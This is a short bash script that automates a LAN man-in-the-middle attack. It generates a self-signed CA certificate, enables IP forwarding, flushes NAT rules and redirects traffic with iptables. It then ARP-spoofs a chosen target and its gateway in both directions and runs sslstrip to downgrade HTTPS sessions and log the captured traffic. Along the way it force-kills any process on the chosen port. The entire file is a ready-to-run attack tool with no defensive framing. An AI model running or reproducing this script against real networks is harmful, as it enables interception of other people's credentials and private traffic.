#!/bin/bash

read -p "create a directory to deposit certificate, input the directory name:" dir
mkdir "$dir"
cd "$dir"
wait

echo -e "\e[1;33m [*] \e[0m \e[1;45m create a self signed certificate...\e[0m\n\n"
openssl genrsa -out ca.key 2048
openssl req -new -x509 -days 1024 -key ca.key -out ca.crt

echo -e "\e[1;33m [*] \e[0m \e[1;45m start port forwarding...\e[0m\n\n"
echo 1 > /proc/sys/net/ipv4/ip_forward

echo -e "\e[1;33m [*] \e[0m \e[1;45m set port forwarding rules for iptables...\e[0m\n"
read -p "input the redirected port(ensure this port is free):" portb
netstat -nlp | grep ":$portb">tempfile 
if [ -s tempfile ]
	then
		kill -9 $(netstat -nlp | grep ":$portb" | awk '{print $7}' | awk -F"/" '{ print $1 }' | head -n 1)
fi
rm tempfile
read -p "input the monitor port(s):" porta

echo -e "\e[1;33m [*] \e[0m \e[1;45m reset iptables rules...\e[0m\n\n"
iptables -t nat -F
for num in $porta
	do
		iptables -t nat -A PREROUTING -p tcp --dport $num -j REDIRECT --to-ports $portb
	done
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080

read -p "target ip:" target
read -p "route ip:" route

echo -e "\e[1;33m [*] \e[0m \e[1;45m arp mitm...\e[0m\n\n"
interface=$(ifconfig | awk '{print $1}' | head -n 1 | cut -d ":" -f 1)
arpspoof -i $interface -t $target $route &>/dev/null &
arpspoof -i $interface -t $route $target &>/dev/null &

echo -e "\e[1;33m [*] \e[0m \e[1;45m sslstrip started.\e[0m\n\n"
mkdir sslstrip_log
sslstrip -l 8080 -w sslstrip_log/log.log
